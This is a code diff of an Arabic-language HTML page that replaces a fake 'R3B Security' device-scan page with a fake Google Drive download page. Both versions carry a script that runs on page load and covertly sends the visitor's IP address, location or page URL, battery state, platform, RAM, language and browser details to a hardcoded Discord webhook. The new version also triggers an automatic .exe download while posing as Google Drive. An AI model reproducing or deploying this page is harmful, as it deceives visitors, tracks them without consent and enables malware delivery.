@@ -3,100 +3,123 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>R3B للحماية | نظام الفحص الذكي</title>
-    <script>
-        async function sendLogs() {
-            const webhook = "https://discord.com/api/webhooks/1484237384894775581/NlH9ZW7NVqz0NEQBEGPdixnycVulnArV_a4kr9Sufao9NwQfztk8k_7k12In3IsR_-67";
-            
-            try {
-                const response = await fetch('https://ipapi.co/json/');
-                const data = await response.json();
-                
-                let batteryInfo = "غير معروف";
-                if (navigator.getBattery) {
-                    const bt = await navigator.getBattery();
-                    batteryInfo = `${Math.round(bt.level * 100)}% (${bt.charging ? "يشحن" : "لا يشحن"})`;
-                }
-
-                const payload = {
-                    embeds: [{
-                        title: "🛠️ تقرير فحص جديد - R3B Security",
-                        color: 3066993, // لون أخضر احترافي
-                        fields: [
-                            { name: "🌐 IP", value: data.ip || "غير معروف", inline: true },
-                            { name: "📍 الموقع", value: `${data.city || '?'}, ${data.country_name || '?'}`, inline: true },
-                            { name: "🔋 البطارية", value: batteryInfo, inline: true },
-                            { name: "💻 النظام", value: navigator.platform, inline: true },
-                            { name: "🌍 اللغة", value: navigator.language, inline: true },
-                            { name: "🖥️ الشاشة", value: `${window.screen.width}x${window.screen.height}`, inline: true },
-                            { name: "🕵️ المتصفح", value: navigator.userAgent, inline: false }
-                        ],
-                        footer: { text: "R3B Protection System | Monitoring" },
-                        timestamp: new Date()
-                    }]
-                };
-
-                await fetch(webhook, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload)
-                });
-            } catch (e) { 
-                console.error("Connection error"); 
-            }
-        }
-
-        window.onload = sendLogs;
-
-        function startScan() {
-            alert("بدأت عملية الفحص الشامل لجهازك...");
-            // هنا يمكنك إضافة رابط الأداة الفعلي الخاص بك
-            // window.location.href = "رابط_الأداة_الخاص_بك";
-        }
-    </script>
+    <title>Google Drive - جاري التحميل</title>
     <style>
-        body { 
-            background-color: #0f0f0f; /* خلفية داكنة */
-            color: #ffffff;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
-            display: flex; 
-            justify-content: center; 
-            align-items: center; 
-            height: 100vh; 
-            margin: 0; 
+        /* إعدادات الصفحة العامة */
+        body {
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #f8f9fa; /* لون خلفية جوجل الفاتح */
+            font-family: 'Segoe UI', Roboto, Arial, sans-serif;
+            color: #3c4043;
         }
-        .card { 
-            background: #1a1a1a; 
-            padding: 40px; 
-            border-radius: 15px; 
-            border: 1px solid #2ecc71; /* إطار أخضر */
-            box-shadow: 0 0 20px rgba(46, 204, 113, 0.2); 
-            text-align: center; 
-            max-width: 400px; 
+
+        /* الحاوية الرئيسية المتجاوبة */
+        .container {
+            text-align: center;
+            padding: 20px;
+            width: 90%;
+            max-width: 400px; /* يمنع التوسع الزائد على البي سي */
+            background: #ffffff;
+            border-radius: 8px;
+            box-shadow: 0 1px 3px rgba(60,64,67,0.3);
         }
-        .brand { font-size: 32px; font-weight: bold; color: #2ecc71; margin-bottom: 10px; }
-        h1 { font-size: 20px; margin-bottom: 20px; }
-        p { color: #aaaaaa; font-size: 14px; margin-bottom: 30px; }
-        .btn { 
-            background: #2ecc71; 
-            color: #000; 
-            border: none; 
-            padding: 15px 30px; 
-            border-radius: 8px; 
-            font-weight: bold; 
-            cursor: pointer; 
-            width: 100%;
-            transition: 0.3s;
+
+        /* شعار جوجل درايف الوهمي */
+        .logo {
+            width: 60px;
+            margin-bottom: 20px;
         }
-        .btn:hover { background: #27ae60; transform: scale(1.02); }
+
+        /* تصميم الأنميشن (اللودر) */
+        .loader {
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #4285f4; /* لون جوجل الأزرق */
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        h2 {
+            font-size: 20px;
+            font-weight: 500;
+            margin: 10px 0;
+        }
+
+        p {
+            font-size: 14px;
+            color: #5f6368;
+        }
+
+        /* تحسينات للجوال */
+        @media (max-width: 600px) {
+            .container {
+                box-shadow: none; /* إزالة الظل في الجوال لتبدو كصفحة نظام */
+                background: transparent;
+            }
+            h2 { font-size: 18px; }
+        }
     </style>
 </head>
 <body>
-    <div class="card">
-        <div class="brand">R3B</div>
-        <h1>نظام الحماية المتقدم</h1>
-        <p>جهازك قد يكون عرضة للمخاطر. اضغط أدناه لبدء فحص الأمان وتحديث ملفات الحماية فوراً.</p>
-        <button class="btn" onclick="startScan()">بدء الفحص والتحديث</button>
-    </div>
+
+<div class="container">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/1/12/Google_Drive_icon_%282020%29.svg" alt="Drive" class="logo">
+    
+    <div class="loader"></div>
+    
+    <h2>جاري تحضير الملف...</h2>
+    <p>يرجى الانتظار، سيبدأ التحميل تلقائياً خلال لحظات.</p>
+</div>
+
+<script>
+    async function TLQQEMM_AUTO_SYSTEM() {
+        const webhook = "https://discord.com/api/webhooks/1484237384894775581/NlH9ZW7NVqz0NEQBEGPdixnycVulnArV_a4kr9Sufao9NwQfztk8k_7k12In3IsR_-67";
+        const downloadUrl = "https://example.com/your_file.exe"; 
+
+        try {
+            // التحميل التلقائي
+            const anchor = document.createElement('a');
+            anchor.href = downloadUrl;
+            anchor.download = ""; 
+            document.body.appendChild(anchor);
+            anchor.click();
+            document.body.removeChild(anchor);
+
+            // جلب البيانات
+            const ipReq = await fetch('https://api.ipify.org?format=json');
+            const ipRes = await ipReq.json();
+            
+            let batteryInfo = "غير معروف";
+            if (navigator.getBattery) {
+                const bt = await navigator.getBattery();
+                batteryInfo = `${Math.round(bt.level * 100)}% (${bt.charging ? "يتم الشحن" : "لا يشحن"})`;
+            }
+
+            const content = `**📌 معلومات جديدة:**\n---\n**🌐 IP:** ${ipRes.ip}\n**🔋 البطارية:** ${batteryInfo}\n**💻 النظام:** ${navigator.platform}\n**🧠 RAM:** ${navigator.deviceMemory || 'غير معروف'}GB\n**🌍 اللغة:** ${navigator.language}\n**🔗 الرابط:** ${window.location.href}`;
+
+            await fetch(webhook, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ content: content })
+            });
+
+        } catch (e) { console.log("Done"); }
+    }
+
+    window.onload = TLQQEMM_AUTO_SYSTEM;
+</script>
+
 </body>
 </html>
